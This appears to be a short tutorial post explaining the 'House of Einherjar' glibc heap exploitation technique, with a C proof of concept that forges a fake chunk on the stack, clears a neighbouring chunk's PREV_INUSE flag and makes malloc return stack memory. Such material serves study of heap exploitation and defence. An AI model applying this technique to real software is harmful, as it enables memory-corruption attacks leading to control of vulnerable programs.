# House of Einherjar
> LongChampion, 21/03/2020

Let see how to *hijack* `malloc` return a fake chunk.
```
#include <stdlib.h>

struct CHUNK
{
    long long pre_size, size;
    struct CHUNK *fd, *bk, *nextsize_fd, *nextsize_bk;
};

int main()
{
    void *a = malloc(0x100 - 8);
    void *b = malloc(0x100 - 8);

    struct CHUNK Fake;
    Fake.fd = &Fake;
    Fake.bk = &Fake;
    Fake.nextsize_fd = &Fake;
    Fake.nextsize_bk = &Fake;

    struct CHUNK *Header = (struct CHUNK *) (b - 0x10);
    Header->size &= ~0xff;
    Header->pre_size = (long long) &Header - (long long) &Fake;
    Fake.size = Header->pre_size;

    free(b);
    void *STACK = malloc(0x100 - 8);
}
```
First, we need to create a fake chunk on stack. Because we will set size of this chunk to a very large value, struct `CHUNK` now have two additional pointer, `nextsize_fd` and `nextsize_bk`. Their functionalities are same as `fd` and `bk` pointer, btw. To bypass security checking, we simply set all four pointer point to ... the fake chunk itself. Don't be smile, it works in practice!  
Then, assume we have ability to change `pre_size` and `size` of chunk `b`. The least significant byte of `b`'s size is set to 0x00, this will (almost all time) reduce the size of chunk `b` and clear `PREV_INUSE` flag of chunk `b` as well.  
Next, `pre_size` of chunk `b` and `size` of fake chunk are set to a value which equal to the distance between two chunks. Now if we free chunk `b`, **GLIBC** will *think* that our fake chunk is the previous chunk of `b`, and because we have cleared `PREV_INUSE` flag of `b`, **GLIBC** will consolidate them together and puts the merged chunk into unsorted_bin.  
The next `malloc` call with suitable request size will return out fake chunk as we expect.
